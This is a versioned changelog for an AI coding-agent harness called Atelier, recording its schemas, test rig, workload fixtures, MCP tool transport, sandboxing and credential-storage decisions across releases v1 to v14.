- **`schemas/session/v1.json`** — `cost_ledger` entries now enforce per-kind required fields via `allOf`/`if`/`then`:
  - `kind: "model_call"` requires `model_id`, `prompt_tokens`, `completion_tokens`, `count_source`.
  - `kind: "cache_bust"` requires `note`.
  - `kind: "tool_call"` requires `latency_ms`.

  The committed example sessions already conformed; no fixture updates needed.

### Project config — ATELIER.md
- **Seed template** at `crates/atelier-core/templates/ATELIER.md`. Markdown with `<!-- HTML comments -->` for the human reader (stripped before injection into the system prompt). Five suggested sections: project description, conventions, don't-touch, useful commands, free-form.
- **Harness contract — `atelier init`** specified in spec §11. Idempotent project bootstrap: creates `<repo>/.atelier/{sessions,tools,hooks}/`, writes `ATELIER.md` from the seed if absent (never overwrites), appends `.atelier/` to existing `.gitignore`. CLI command implemented as part of Phase A.
- **Spec §5 subsection** describes ATELIER.md as a §5 (visible context) artifact loaded at session start and injected into the system prompt as persistent context.

### Rig upgrades
- `validate_artifacts.py` gains two new rules (`examples/config/routing.v1.json` and `examples/config/permissions.v1.json`).
- `test_schemas.py` gains **18 new regression tests** — 6 for routing config (valid minimal/full, null roles, required executor, bad pattern, capitalised provider rejected), 6 for permission state (each shape kind valid; unknown shape kind rejected; bad scope rejected), 6 for the per-kind cost-ledger required fields (each kind's positive + negative cases).
- New tallies: **16 schemas, 32 artifacts, 80 rig self-tests**, all passing.

### Documentation sweep
- `README.md` — tally line updated; layout tree adds `examples/config/`; new "Project bootstrap" section documenting `atelier init` and ATELIER.md.
- `tests/README.md` — table reflects 80 tests + new schemas mentioned.
- `schemas/README.md` — rows for `routing.v1.json` and `permission_state.v1.json` added.
- `examples/README.md` — layout table + current-examples table extended.
- `tasks/todo.md` — status block updated to v14 tallies.
- Spec — §1 (routing), §5 (ATELIER.md + project bootstrap), §8 (persistent permission state), §11 (atelier init).

## v13 — 2026-05-16
Three Phase A blockers closed; full documentation sweep.

### Phase A blockers — closed
- **Reference machine spec** (`tests/perf/reference.md`) populated against this laptop: MacBook Pro (`MacBookPro18,1`), Apple M1 Pro (10 cores, 8P + 2E), 32 GB RAM, 926 GB SSD, macOS 26.4.1 (build `25E253`), Python 3.14.4, Node v25.8.2. Performance budgets in the spec are now anchored.
- **Session storage on-disk layout** decided and written into spec §14: hybrid per-repo `.atelier/sessions/<uuid>/` (session JSON + content-addressed diff blobs) + global `~/.atelier/registry.json` index. Also resolves what Phase D §4's `diff_ref` strings point at, ahead of schedule.
- **Tool manifest + hook manifest schemas** added:
  - `schemas/config/tool_manifest.v1.json` — registers custom tools with shell or http implementation, side-effect class, input/output JSONSchemas, `${env:…}` / `${keychain:…}` interpolation.
  - `schemas/config/hook_manifest.v1.json` — registers pre-tool / post-tool / on-verify-* hooks with a required `time_budget_ms` and optional `tool_filter` globs.
  - Both decisively distinguish shell vs http implementation via `oneOf` on `implementation.kind`.

### Example manifests + rmcp spike
- `examples/tools/grep.v1.json` (local-safe shell tool) and `examples/tools/web_fetch.v1.json` (shared-state http tool using `${keychain:…}` interpolation).
- `examples/hooks/log_pre_tool.v1.json` (pre-tool shell hook with 50 ms time budget).
- `examples/README.md` documents the global vs per-repo override convention.
- `experiments/rmcp_spike/` — Phase A prerequisite. Documented procedure + decision matrix + Rust skeleton an implementor runs on the reference machine in ~30–60 min to decide GO / GO-WITH-CAVEATS / NO-GO on `rmcp`. Skeleton is intentionally a stub since `cargo` was unavailable during this documentation pass.

### Rig upgrades
- `validate_artifacts.py` gains rules for `examples/tools/*.json` and `examples/hooks/*.json`.
- `test_schemas.py` gains 10 new tests covering tool + hook manifest valid/invalid corpora.
- New tallies: **14 schemas, 30 artifacts, 62 rig self-tests**, all passing.

### Documentation sweep
- `README.md` — updated layout tree (adds `examples/`, `experiments/`), tally line (14/30/62), "what's blocking work" section (now lists rmcp spike + baseline capture; reference machine moved off the blocker list).
- `tests/README.md` — table reflects 62 tests, tool + hook manifest mention, reference machine populated.
- `schemas/README.md` — adds rows for the two new manifest schemas.
- `tasks/todo.md` — status block updated to v13 totals; Q2 marked resolved; Q4 (checkpoint storage) marked resolved early via the session-storage decision; new Q7 added for the rmcp spike.
- Spec — §14 gains an "On-disk storage" subsection.

### What v13 did NOT change
- The Rust crates still compile in principle but have not been `cargo check`'d in this session (no cargo here).
- Phase A code remains unwritten; nothing in v13 closes the implementation gap, only the Phase A *prerequisites*.

## v12 — 2026-05-15
Closed the last rig-side verification gap: session-artifact validation, including cross-schema `$ref` resolution that previously failed silently.

### Cross-schema reference resolution
- **`tests/_schema_helpers.py`** — new shared module. Builds a `referencing.Registry` mapping every schema's `$id` URL to its local-file content. Both `validate_artifacts.py` and `test_schemas.py` import from here.
- Without this, the session schema's `$ref` to `model_protocol/envelope.v1.json` raised `Unresolvable` and tests that included an envelope silently never exercised the inner schema. Locked-in proof: a new test asserts the registry is load-bearing.

### Example session artifacts
- **`tests/sessions/examples/minimal_success.json`** — a complete successful turn (read → write → pytest, `claimed_done: true`, full envelope, cost ledger, checkpoint pair, three tool fixtures with results).
- **`tests/sessions/examples/with_tool_error.json`** — a turn where the shell tool was blocked by the sandbox. Exercises the `ToolError` taxonomy in `tool_fixtures.error.kind` (`SandboxViolation`), the `uncertainty` envelope path, the `plan` field, and a `constraints` pin.
- **`validate_artifacts.py`** gains a `tests/sessions/examples/*.json` rule pointing at `schemas/session/v1.json`. Both committed examples validate end-to-end with cross-schema $ref traversal.

### New regression tests (in `test_schemas.py`)
- `test_session_with_valid_envelope_passes_cross_schema` — happy path.
- `test_session_with_invalid_envelope_kind_rejected` — bad envelope `kind` trips the inner schema's enum via $ref.
- `test_session_with_invalid_grounding_source_rejected` — bad grounding source likewise.
- `test_example_session_files_validate` — the committed example files validate as-is.
- `test_unregistered_schema_ref_would_fail_without_registry` — sanity guard.

### Verification status
- 11 schemas meta-validated.
- 27 artifacts validated (was 25; +2 example sessions).
- 52 rig self-tests passing (was 47; +5 cross-schema).
- 11 task dry-runs passing.

## v11 — 2026-05-15
All verification gaps closed. Rig is now self-testing and CI-ready.

### Runner upgrades
- **Per-task `checks.json`** for all 11 tasks. Structured assertions (`command + expect{exit_code/contains/pattern}` or `file_unchanged` byte-equal hash check). The runner executes every check after the harness completes and folds per-check results into the result JSON. Closes the no-op-harness exploit on tasks whose starting state is already passing.
- **Schema for checks**: new `schemas/workload/task_checks.v1.json` with `oneOf` enforcement (command XOR file-unchanged) and `anyOf` requiring at least one assertion in `expect`.
- **`<<<atelier-meta>>>` sentinel validation**: after extraction, the payload is validated against `schemas/workload/atelier_meta_sentinel.v1.json`. Violations land in the result's `harness.meta_schema_violation` field and fail the task.
- **`test_command` per task**: `meta.json` carries an optional argv list defaulting to `pytest`; lets non-Python fixtures specify their own runner.
- **`language` per task**: optional `language` enum (`python` / `typescript` / `go` / `rust`).
- **Result schema** (`schemas/workload/runner_result.v1.json`): adds `checks` array per harness result and `meta_schema_violation` on the harness sub-object.

### t11 TypeScript fixture
- **New `t11_add_typescript_function`** — TypeScript equivalent of t01. Uses Node's built-in test runner via `node --test tests/test_utils.ts` (Node 22+ handles `.ts` directly). Exists so §7 Tier-1 hallucination detector has somewhere to run when implemented. Verified end-to-end: starting state fails (rc=1), synthetic real implementation passes, no-op caught.

### Artifact validator upgrades
- **Fenced JSON in few-shot markdown** now validates against the envelope schema. Catches drift between `prompts/protocol_fewshot/*.md` and `schemas/model_protocol/envelope.v1.json`.
- README.md files in glob targets are skipped (they're documentation, not examples).
- `task_checks.v1.json` added to the artifact-validator's rules.

### Rig self-tests
- **`tests/test_schemas.py`** — 26 tests. Schema regression suite locking valid+invalid corpus per schema.
- **`tests/test_validators.py`** — 4 tests. End-to-end invocation of both validator scripts plus direct internals.
- **`tests/test_runner.py`** — 17 tests. `load_task`, `extract_meta` (valid / parse-error / schema-violation paths), `run_check` (all assertion types), subprocess invocations including no-op detection on t05 and t07.
- Total: **47 rig tests, all passing.**

### Makefile + CI
- `make rig-tests` target added; `make check` now runs `schemas → artifacts → rig-tests → summary`.
- **`.github/workflows/check.yml`** — runs `make check` on every push and PR against `ubuntu-latest` and `macos-latest`. Python 3.12 + Node 22.

### Verification status
- 11 schemas meta-validated.
- 25 artifacts validated.
- 47 rig self-tests passing.
- 11 task dry-runs passing.
- No-op exploit verified caught on t05, t07, t11.

## v10 — 2026-05-15
Phase A blockers resolved. Five decisions ratified in spec and scaffolded in code.

### 1. Rust workspace
- **Cargo workspace at repo root** with three member crates under `crates/`:
  - `atelier-core` — agent loop, BYOM adapters, MCP client, session state (no UI deps)
  - `atelier-gui` — Tauri 2.x shell (scaffold)
  - `atelier-tui` — ratatui + crossterm (scaffold)
- **`rust-toolchain.toml`** pins Rust 1.83.0 + rustfmt + clippy.
- **`[workspace.dependencies]`** is the single source of truth for version pins; member crates use `{ workspace = true }`.
- **`.gitignore`** at repo root for `target/`, pycache, editor cruft.

### 2. Tauri 2.x
- Pinned to `2.2` in the workspace deps. Spec §2.5 crate table updated. Frontend stack (TypeScript + Vite + Svelte recommended) chosen by the implementor on first `tauri init`.

### 3. Diff-application atomicity
- **All-or-nothing per turn. No opt-out.** New §3 "Atomic application" subsection: stage to temp tree, run pre-commit validators, atomic move on all-pass, discard + structured error on any failure. One §4 checkpoint per turn covers the whole batch. §7 verification gate runs against the known post-state.

### 4. Tool error model
- **Named taxonomy** in spec §2.5 "Tool error model" with explicit state-machine routing per variant.
- **Rust types** in `crates/atelier-core/src/error.rs` (`ToolError` + `Recovery` enums), unit-tested for the routing decisions.
- **Session schema update**: `tool_fixtures` entries now carry either `result` (success) or `error` (failure with `kind` matching the taxonomy + `message`). Enforced via `oneOf`.

### 5. Credential storage
- **OS keychain primary** via `keyring`; env var override; plaintext config forbidden.
- New §11 "Credential storage" subsection: resolution order, CLI commands (`atelier login/logout/rotate/whoami`), interpolation tokens `${env:NAME}` and `${keychain:NAME}`.
- **MCP servers schema updated**: `env` and `headers` field descriptions document the interpolation tokens.

### Crate-choices table additions (spec §2.5)
- `tokio-util` (cancellation), `tempfile` (atomic staging), `keyring` (secrets), `thiserror`/`anyhow` (errors), `tracing` (logging) all added.
- `Tauri` pin raised to **2.x** explicitly.

### README + todo
- README layout tree adds `Cargo.toml`, `rust-toolchain.toml`, `crates/`.
- todo's Phase A gains explicit decision-receipts: workspace scaffolded, Tauri version pinned, diff atomicity decided, error taxonomy live in code, secrets via keyring.

## v9 — 2026-05-15
MCP as primary tool transport.
- **Spec preamble**: `atelier-core` now lists "MCP client" alongside agent loop and BYOM adapters.
- **§2.5 Agent loop**: added `rmcp` to the crate-choices table; added a "Tool dispatch is unified" subsection — built-in and MCP-routed tools go through the same state transitions.
- **§5 Visible context**: context-panel items can now be MCP resources (per §15), surfaced uniformly.
- **§11 Security**: added an MCP-servers subsection — stdio servers run inside the sandbox; HTTP/SSE servers count as egress; server registration goes through §8 trust budget at the server level.
- **§12 Privacy**: MCP HTTP/SSE servers explicitly count as egress targets and are recorded in the audit log; local-only mode disables them.
- **§15 Extensibility** rewritten — MCP is now the primary tool transport. Built-in tools (file ops, shell, search) exposed via the same internal MCP interface for uniformity. Hooks wrap built-in and MCP-routed calls identically. MCP resources mapped to §5 context; MCP prompts deferred to v0.2.
- **Phase A build plan** adds the §15 MCP client (via `rmcp`) and an extended gate: at least one third-party MCP server (`@modelcontextprotocol/server-filesystem`) must register and dispatch during canonical-workload runs.
- **New schema**: `schemas/config/mcp_servers.v1.json` — server registration manifest, with transport-conditional required fields (`command` for stdio, `url` for http/sse).
- **README** Stack section calls out MCP-out-of-the-box.
- **`tasks/todo.md`** gains a §15 MCP-client work list under Phase A.

## v8 — 2026-05-15
Architecture decisions ratified.
- **Implementation language: Rust.** Three crates declared in the spec preamble: `atelier-core` (agent loop, BYOM adapters, session state — no UI deps), `atelier-gui` (Tauri shell), `atelier-tui` (`ratatui` + `crossterm`).
- **Added §2.5 Agent loop.** Single-turn streaming state machine on `tokio`; named states (`Idle / Streaming / ToolDispatching / ToolExecuting / Verifying / AwaitingUser / Failed / Done`); cancel via Rust drop semantics; bounded in-turn tool parallelism (cap=4 PROVISIONAL). Rejected alternatives table (ReAct scratchpad, mandatory plan-then-execute, Reflexion, ToT, hierarchical loop) with reasons.
- **§3 GUI/TUI parity decision** now names Tauri (GUI) and `ratatui` (TUI) explicitly; both consume `atelier-core` via the broadcast channel.
- **§6 Steerability** points to §2.5: cancellation is drop semantics, not an invented protocol.
- **§7 Verification** clarifies that `claimed_done` triggers a `Verifying` state transition in the §2.5 state machine; the harness owns the transition.
- **Phase A build plan updated** to scaffold the Cargo workspace and `atelier-core` first, with the agent-loop gate folded into the overall Phase A gate.
- **TOC updated** to include §2.5.
- **README** gains a "Stack" section naming Rust + the three crates.
- **`tasks/todo.md`** gains a new §2.5 work list under Phase A.

## v7 — 2026-05-15
Rig polish + remaining fixtures + project plumbing.
- **Wrote the remaining five workload fixtures.** t03 (config migration, rc=1 starting state), t04 (add missing test, rc=5), t07 (refactor preserve behavior, rc=0 starting state with 6 tests), t08 (add input validation, rc=0 starting state with 1 test), t09 (migrate signature, rc=0 starting state with 6 tests). All ten canonical tasks now exist.
- **Added per-task `meta.json`** for all 10 tasks, declaring `expected_starting_returncode`, `turn_cap`, priority flag, and exercises. Backed by `schemas/workload/task_meta.v1.json`.
- **Upgraded the runner** to read `meta.json`, assert the dry-run pytest return code matches the declared value, and produce structured output conforming to `schemas/workload/runner_result.v1.json`. Added `--summary` mode and `--harness-timeout-s` flag; the previously-hardcoded 300s timeout is now PROVISIONAL with a calibration note in the source.
- **Wrote `tests/validate_artifacts.py`** — validates concrete artifacts (meta files, baselines, overhead reports, runner results) against their declared schemas. Distinct from `tests/validate_schemas.py` which meta-validates the schemas themselves.
- **Added `schemas/workload/atelier_meta_sentinel.v1.json`** formalising the `<<<atelier-meta>>>…<<<end>>>` payload format harnesses optionally emit for telemetry.
- **Added root `pyproject.toml`** declaring `jsonschema` and `pytest` under the optional `rig` extra; `norecursedirs` excludes the per-task fixtures from project-level pytest collection.
- **Added `Makefile`** with targets: `check` (schemas + artifacts + summary), `schemas`, `artifacts`, `dry-run`, `summary`, `install-rig`, `clean`. Single-command orchestration.
- **Wrote `compare_baselines.py`** (was a forward reference in v6) — diffs an Atelier prompt-count file against the Claude Code baseline, reports per-task ratios + aggregate, exits 0 iff aggregate ≤ target ratio.
- **Verified end-to-end:** `make check` passes — 10 schemas meta-validated, 10 task-meta artifacts validated, all 10 dry-runs match their declared starting return codes.

## v6 — 2026-05-15
First round where the spec text changed only in minor ways; the bulk of work is implementation artifacts.
- **Wrote the remaining three priority workload fixtures.** t05 (fix-bug-from-failing-test; pytest rc=1 at starting state, as designed), t06 (add-cli-flag; pytest rc=0 at starting state with 3 existing tests), t10 (implement-from-spec; pytest rc=2 at starting state — `LRUCache` not implemented yet, 7 tests waiting). All five priority fixtures now exist.
- **Wrote the workload runner** at `tests/workload/runner/runner.py`. Supports `--dry-run` (validate fixture starting state, no harness) and `--harness-cmd CMD` (invoke a harness via shell, pipe prompt to stdin). Extracts an optional `<<<atelier-meta>>>{json}<<<end>>>` block from harness stdout for turn-count and timing telemetry. **Verified end-to-end against all 5 priority tasks in dry-run mode.**
- **Wrote the schema validator** at `tests/validate_schemas.py`. Iterates `schemas/**.json`, runs JSON-Schema meta-validation, reports pass/fail per file. **Run against the current 7 schemas; all 7 pass meta-validation.**
- **Wrote `baseline_procedure.md`.** Specifies how to capture the Claude Code baseline: reference machine, version pin, model, per-task three-run median, counting rules, when to recapture.
- **Spec updated to point at the runner and validator** so the schema-validation phase-gate step has a runnable form.

## v5 — 2026-05-15
- **Wrote t01 and t02 workload fixtures.** `t01_add_pure_function/` (5 files; pytest collects 0 tests in starting state, exit 0) and `t02_rename_symbol_multi_file/` (10 files; pytest passes 6 tests in starting state). Both fixtures verified locally with `pytest`.
- **Added the session artifact schema** at `schemas/session/v1.json`. The session is the central persistent unit; it wraps conversation history (with envelopes), cost ledger, checkpoint tree, tool-result fixtures, memory, plan, constraints, and the recovery log. Other schemas reference into it.
- **Fixed the DoD inconsistency** introduced in v4. "Phase A + B (first shippable)" is now relabelled "Backend milestone — Phase A + B (internal; not user-facing)"; the §3 GUI gate moves to a new "First user-facing release — Phase A + B + C" section. The first user-facing release is no longer claimed before the UI pillar ships.
- **Marked `$0.00028/sec` PROVISIONAL** with calibration method (survey actual hardware costs once §13 telemetry yields usage data).
- **Added schema validation as a phase-gate requirement.** Every phase gate now includes a schema-validation step; every artifact emitted by phase tests must validate against its `schemas/` schema; a failing validation blocks the gate.
- **Workload README status updated.** t01 and t02 boxes checked; priority subset (t01, t02, t05, t06, t10) marked.

## v4 — 2026-05-15
- **Named the harness: Atelier.** Spec header and prose updated.
- **Removed the published-criticisms citation table.** v3's table was structurally good but every row pointed at the same placeholder source. Brought back later if/when real external sources exist.
- **Moved schemas out of the spec.** `schemas/` directory now holds:
  - `baselines/permission_prompts.v1.json`
  - `protocol/overhead.v1.json`
  - `model_protocol/envelope.v1.json`
  - `telemetry/payload.v1.json`
  - `audit/egress.v1.json`
  - `config/permission_shapes.v1.json`
  - `versions.md` (compatibility matrix for the three independent version streams)
- **Collapsed v0.1 MIP and full v1.** Phases A+B are now explicitly called out as "the smallest shippable harness"; the v0.1-specific table and cut list are gone.
- **Removed self-referential change history from spec.** All "addresses v2…", "resolves…" etc. removed; spec reads clean to a fresh implementer.
- **Wrote the canonical workload** at `tests/workload/canonical/README.md`. 10 tasks listed with success criteria. Priority subset (t01, t02, t05, t06, t10) named for Phase A+B unblock.
- **Fixed the §6/§14 mid-stream cancel inconsistency.** §14's concurrent-edit modal now operates at tool-call boundaries — queue the next dispatch rather than cancel mid-stream. The modal no longer depends on §6's cancel plumbing.
- **Specified `conformance()` overhead.** Bounded ring buffer of last 100 calls, in-memory only.
- **Specified LSP-decline path.** Declined auto-install → Tier-1 degrades to Tier-2 for that language; UI offers one-click retry.
- **Changed local-cost default** from `$0/sec` to `$0.00028/sec` (≈ amortized consumer GPU). Local cost now visible by default in routing decisions.
- **Added headless behavior** for §14 modal: `--non-interactive` flag auto-resolves to "accept external edits"; without it, headless contexts time out at the auto-pause threshold and exit non-zero.
- **Specified action-shape for shell-style tools:** `argv[0]` + flag-name set (not flag values). Examples given in spec; schema at `schemas/config/permission_shapes.v1.json`.
- **Fixed recovery-log placement.** Partial mid-turn output no longer goes into conversation history (which would mislead the next turn's model); it goes to a `recovery_log` slot surfaced as a UI banner.
- **Marked previously unmarked numbers PROVISIONAL:** §2 95% conformance threshold, §7 7-day same-family window, §14 5-minute auto-pause, §15 200ms hook budget — all now PROVISIONAL with calibration methods.
- **Added `--re-execute` replay mode** to §4 — live re-run instead of fixture playback; comparison report shows divergence.
- **Added nightly CI job for overhead refresh** at `ci/nightly/protocol_overhead.yml` with a 10%-over-7-days regression alert.

## v3
- v0.1 MIP defined.
- Build order replaced with phased DAG.
- Capability matrix "claimed-but-broken" column added.
- Local cost latency-weighted (default $0/sec).
- Model Protocol prompting strategy + few-shot examples.
- Tier-1 LSP scoped to TypeScript for v0.1; shell-out decision.
- Tool-result fixture replay subsystem.
- Performance budgets split (internal / end-to-end / hooks).
- Published-criticisms citation table (later cut in v4).
- Schemas as appendix (later moved to `schemas/` in v4).

## v2
- Model Protocol extracted as §2.
- Hard tradeoffs decided in-line.
- Acceptance gates split: mechanical vs UX.
- Security, Privacy, Telemetry, Persistence, Extensibility sections added.
- Steerability reframed as cancel-and-restart.

## v1
- 9 pillars + cross-cutting + hard tradeoffs.
